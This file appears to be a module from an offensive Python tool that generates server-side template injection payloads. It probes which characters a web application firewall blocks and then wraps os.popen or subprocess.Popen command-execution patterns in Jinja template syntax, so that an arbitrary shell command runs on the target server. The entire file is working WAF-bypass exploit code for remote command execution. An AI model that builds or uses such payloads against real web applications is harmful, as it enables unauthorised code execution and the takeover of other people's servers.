from ssti import pattern
from ssti.int_vars import get_useable_int_vars
import logging

logger = logging.Logger("[SSTI ShellCmd]")

# should_set_abcd

def set_int_vars(waf_func):
    ints, var_names, payload = get_useable_int_vars(waf_func)
    if len(ints) == 0:
        logger.warning("No IntVars For YOU!")
    pattern.vars_str = payload
    pattern.number_dict = dict(zip(ints, var_names))

def shell_cmd(waf_func, cmd):

    set_int_vars(waf_func)

    if waf_func("{{"):
        outer_pattern = "{{PAYLOAD}}"
    else:
        logging.warning("{{ is being waf, no execute result for you!")
        outer_pattern = "{% set x=PAYLOAD %}"

    types = [
        pattern.OSPopenPattern1,
        pattern.OSPopenPattern2,
        pattern.SubprocessPopenPattern1,
    ]
    for t in types:
        mod = t(cmd)
        ret = mod.test_requirements(waf_func)
        if ret:

            logger.info("Bypassing WAF Success!")

            payload = outer_pattern.replace("PAYLOAD", mod.payload)
            if pattern.should_set_abcd:
                payload = pattern.vars_str + payload
            return payload
            
    logger.warning("Bypassing WAF Failed.")
    return None